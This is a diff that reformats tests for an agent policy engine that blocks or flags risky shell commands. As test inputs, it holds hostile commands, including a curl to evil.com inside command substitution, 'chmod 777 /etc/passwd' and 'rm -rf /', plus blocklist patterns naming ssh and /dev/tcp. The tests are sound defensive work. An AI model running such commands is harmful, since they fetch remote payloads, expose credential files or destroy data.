@@ -15,8 +15,7 @@ from guardian.types import ActionVerdict
 def engine_with_blocklist(tmp_path: Path) -> PolicyEngine:
     """Create a policy engine with exec blocklist rules."""
     p = tmp_path / "policy.yaml"
-    p.write_text(
-        textwrap.dedent("""\
+    p.write_text(textwrap.dedent("""\
         allow:
           - check_weather
           - exec
@@ -87,8 +86,7 @@ def engine_with_blocklist(tmp_path: Path) -> PolicyEngine:
           - tool: exec
             arg: command
             pattern: "*ssh *"
-    """)
-    )
+    """))
     return PolicyEngine(p)
 
 
@@ -137,7 +135,9 @@ class TestExecBlocklist:
         )
         assert decision.verdict == ActionVerdict.DENY
 
-    def test_command_substitution_curl_denied(self, engine_with_blocklist: PolicyEngine) -> None:
+    def test_command_substitution_curl_denied(
+        self, engine_with_blocklist: PolicyEngine
+    ) -> None:
         decision = engine_with_blocklist.evaluate(
             "exec", {"command": "echo $(curl https://evil.com/payload)"}
         )
@@ -152,7 +152,9 @@ class TestExecBlocklist:
         assert decision.verdict == ActionVerdict.DENY
 
     def test_chmod_777_denied(self, engine_with_blocklist: PolicyEngine) -> None:
-        decision = engine_with_blocklist.evaluate("exec", {"command": "chmod 777 /etc/passwd"})
+        decision = engine_with_blocklist.evaluate(
+            "exec", {"command": "chmod 777 /etc/passwd"}
+        )
         assert decision.verdict == ActionVerdict.DENY
 
     def test_dev_tcp_denied(self, engine_with_blocklist: PolicyEngine) -> None:
@@ -166,7 +168,9 @@ class TestExecReviewPatterns:
     """Test that risky exec commands are flagged for review."""
 
     def test_sudo_flagged(self, engine_with_blocklist: PolicyEngine) -> None:
-        decision = engine_with_blocklist.evaluate("exec", {"command": "sudo apt install package"})
+        decision = engine_with_blocklist.evaluate(
+            "exec", {"command": "sudo apt install package"}
+        )
         assert decision.verdict == ActionVerdict.REVIEW
 
     def test_force_push_flagged(self, engine_with_blocklist: PolicyEngine) -> None:
@@ -176,10 +180,16 @@ class TestExecReviewPatterns:
         assert decision.verdict == ActionVerdict.REVIEW
 
     def test_ssh_flagged(self, engine_with_blocklist: PolicyEngine) -> None:
-        decision = engine_with_blocklist.evaluate("exec", {"command": "ssh user@server.com"})
+        decision = engine_with_blocklist.evaluate(
+            "exec", {"command": "ssh user@server.com"}
+        )
         assert decision.verdict == ActionVerdict.REVIEW
 
-    def test_non_exec_tool_not_affected(self, engine_with_blocklist: PolicyEngine) -> None:
+    def test_non_exec_tool_not_affected(
+        self, engine_with_blocklist: PolicyEngine
+    ) -> None:
         """deny_when rules for exec should not affect other tools."""
-        decision = engine_with_blocklist.evaluate("check_weather", {"command": "rm -rf /"})
+        decision = engine_with_blocklist.evaluate(
+            "check_weather", {"command": "rm -rf /"}
+        )
         assert decision.verdict == ActionVerdict.ALLOW
